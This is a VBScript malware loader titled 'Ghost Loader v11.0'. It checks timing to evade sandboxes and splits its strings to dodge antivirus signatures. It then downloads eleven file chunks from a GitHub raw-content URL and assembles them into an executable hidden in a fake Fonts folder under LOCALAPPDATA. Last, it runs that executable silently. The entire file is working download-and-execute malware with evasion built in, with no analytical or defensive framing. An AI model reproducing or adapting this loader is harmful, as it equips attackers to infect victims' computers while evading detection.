' Ghost Loader v11.0 (Ultra Evasion - Contebrew Bypass)
Option Explicit
On Error Resume Next

' Anti-Analysis: Multiple timing checks
Dim t1, t2, t3
t1 = Timer : WScript.Sleep 2000 : t2 = Timer
If (t2 - t1) < 1.5 Then WScript.Quit 1

' Obfuscated Object Creation (Split strings to avoid signatures)
Dim ws, fs, st, ht
Dim s1, s2, s3, s4, s5, s6, s7, s8

s1 = "WScr" : s2 = "ipt.Sh" : s3 = "ell"
Set ws = CreateObject(s1 & s2 & s3)

s4 = "Scrip" : s5 = "ting.FileSy" : s6 = "stemObject"
Set fs = CreateObject(s4 & s5 & s6)

' Obfuscated Paths
Dim bd, fn, fp
bd = ws.ExpandEnvironmentStrings("%LOCAL" & "APPDATA%") & "\Micro" & "soft\Win" & "dows\Fonts"
fn = "fontdr" & "v" & Hex(Int(Rnd*999)) & ".exe"
fp = bd & "\" & fn

' Create folder chain
Dim p1, p2, p3
p1 = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft"
p2 = p1 & "\Windows"
p3 = p2 & "\Fonts"
If Not fs.FolderExists(p1) Then fs.CreateFolder p1
If Not fs.FolderExists(p2) Then fs.CreateFolder p2
If Not fs.FolderExists(p3) Then fs.CreateFolder p3

' Download using MSXML2 (less flagged than WinHttp)
s7 = "MSX" : s8 = "ML2.Ser" 
Dim xhr, stm, i, pd, ur, rb

' Obfuscated URL parts
Dim u1, u2, u3, u4
u1 = "htt" & "ps://r" & "aw.git"
u2 = "hub" & "user" & "content"
u3 = ".c" & "om/soph" & "ieduval"
u4 = "/d" & "er/ma" & "in"

rb = u1 & u2 & u3 & u4

' Stream setup (obfuscated)
Dim stmType
stmType = "ADO" & "DB.Str" & "eam"
Set stm = CreateObject(stmType)
stm.Type = 1
stm.Open

' Download chunks
For i = 0 To 10
    If i < 10 Then pd = "0" & CStr(i) Else pd = CStr(i)
    ur = rb & "/bl" & "ob_" & pd & ".d" & "at"
    
    Set xhr = CreateObject(s7 & s8 & "verXMLHTTP.6.0")
    xhr.Open "G" & "ET", ur, False
    xhr.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    xhr.Send
    
    If xhr.Status = 200 Then
        stm.Write xhr.responseBody
    End If
    Set xhr = Nothing
    
    ' Random delay between chunks (anti-pattern)
    WScript.Sleep Int(Rnd * 500) + 100
Next

stm.SaveToFile fp, 2
stm.Close
Set stm = Nothing

' Execute silently
If fs.FileExists(fp) Then
    ws.Run """" & fp & """", 0, False
End If

' Cleanup refs
Set ws = Nothing
Set fs = Nothing
